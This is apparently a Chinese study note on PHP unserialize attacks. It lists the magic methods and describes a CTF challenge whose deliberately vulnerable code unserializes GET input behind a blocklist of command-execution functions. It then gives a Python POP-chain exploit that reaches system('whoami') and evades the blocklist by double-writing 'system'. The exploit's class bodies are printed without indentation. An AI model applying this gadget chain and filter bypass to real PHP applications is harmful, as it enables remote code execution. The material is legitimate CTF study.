---
title: php-unserialize
date: 2025-04-01 18:12:43
tags:
---

## magic函数：

```
__construct()     类的构造函数，创建对象时触发

__destruct()      类的析构函数，对象被销毁时触发

__call()          在对象上下文中调用不可访问的方法时触发

__callStatic()    在静态上下文中调用不可访问的方法时触发

__get()           读取不可访问属性的值时，这里的不可访问包含私有属性或未定义

__set()           在给不可访问属性赋值时触发

__isset()         当对不可访问属性调用 isset() 或 empty() 时触发

__unset()         在不可访问的属性上使用unset()时触发

__invoke()        当尝试以调用函数的方式调用一个对象时触发

__sleep()         执行serialize()时，先会调用这个方法

__wakeup()        执行unserialize()时，先会调用这个方法

__toString()      (1)echo ($obj) / print($obj) 打印时会触发 (2)反序列化对象与字符串连接时 (3)反序列化对象参与格式化字符串时 (4)反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型） (5)反序列化对象参与格式化SQL语句，绑定参数时 (6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时 (7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用 (8)反序列化的对象作为 class_exists() 的参数的时候
```

### NOTE : PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的。

public（公有）：公有的类成员可以在任何地方被访问。

protected（受保护）：受保护的类成员则可以被其自身以及其子类和父类访问。

private（私有）：私有的类成员则只能被其定义所在的类访问。

注意：访问控制修饰符不同，序列化后属性的长度和属性值会有所不同，如下所示：

public：属性被序列化的时候属性值会变成 属性名

protected：属性被序列化的时候属性值会变成 \x00*\x00属性名

private：属性被序列化的时候属性值会变成 \x00类名\x00属性名


## 以此记录一道题目

```
<?php
class A {
    private $hacker;
    public function __toString() {
        echo $this->hacker->name;
        return "";
    }
}
class B {
    private $data;
    public function __wakeup() {
        // If data is an object, its __toString() might get invoked.
        if (! is_object($this->data)) {
            $this->data = "data";
        }
    }
}
class C {
    public $finish;
    public function __get($value) {
        // Trigger a method on the finish property when accessing any property.
        $this->finish->hacker();
        echo 'nonono';
    }
}
class D {
    protected $target;
    public function __clone() {
        // When cloned, attempt to call an initializer method on target.
        if (method_exists($this->target, 'init')) {
            $this->target->init();
        }
    }
}
class E {
    protected $hacker;
    public function __invoke($parms1) {
        echo $parms1;
        $this->hacker->welcome();
    }
}
class F {
    public $secret;
    public function __set($name, $value) {
        // On setting any property, trigger the secret’s run method if it exists.
        $this->secret = $value;
        if (method_exists($this->secret, 'run')) {
            $this->secret->run();
        }
    }
}
class G {
    public static $staticVal = "CTF";
    public static function __callStatic($method, $args) {
        // A static call that echoes the method name and can trigger an alert if available.
        echo "Static call: " . $method;
        if (isset($args[0]) && method_exists($args[0], 'alert')) {
            $args[0]->alert();
        }
    }
}
class H {
    public $username = "admin";
    public function __destruct() {
        // On object destruction, call welcome.
        $this->welcome();
    }
    public function welcome() {
        echo "welcome~ " . $this->username;
    }
}
class K {
    public $func;
    public function __call($method, $args) {
        // Forward the call to a function stored in func.
        call_user_func($this->func, 'welcome');
    }
}
class R {
    private $key;
    protected $finish;
    protected $finish1;
    private $method;
    private $args;
    public function __construct() {
        $this->key = false;
    }
    public function welcome() {
        if ($this->key === true && isset($this->finish1->name) && $this->finish1->name) {
            if ($this->finish->finish) {
                call_user_func_array($this->method, $this->args);
            }
        }
    }
}
class S {
    protected $payload;
    public function __sleep() {
        // Only the payload property is serialized.
        return array($payload);
    }
    public function __wakeup() {
        // On wakeup, if payload is callable, execute it.
        if (is_callable($this->payload)) {
            call_user_func("printf", $this->payload);
        }
    }
}
class T {
    public $info;
    public function __debugInfo() {
        // Customize debug info output.
        return array("info" => "Debugging " . $this->info);
    }
    public function run() {
        echo "Running: " . $this->info;
    }
}
function nonono($a)
{
    $filter = "/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i";
    return preg_replace($filter, '', $a);
}
if (isset($_GET['class'])) {
    unserialize(nonono($_GET['class']));
} else {
    highlight_file(__FILE__);
}
```

下面直接给出pop链,因为难度不高，权且拿来复习和记录。

```
from phpserialize import *
from urllib.parse import quote

class R: # 虚构对象，满足$this->finish1->name和$this->finish->finish的判定
public_name='xyz'
public_finish=True

class R: # call_user_func_array($this->method, $this->args);
private_method='system'
private_args=['whoami']
private_key=True
protected_finish=R()
protected_finish1=R()

class E:
protected_hacker=R() # 触发 R::welcome()

class K:
public_func=E() # 触发 E::__invoke()

class C:
public_finish=K() # 触发 K::__call()

class A:
private_hacker=C() # 触发 C::__get()

class H:
public_username=A() # 触发 A::__toString()

print(quote(serialize(H())).replace('system','syssystemtem')) # 双写绕过nonono()过滤
```
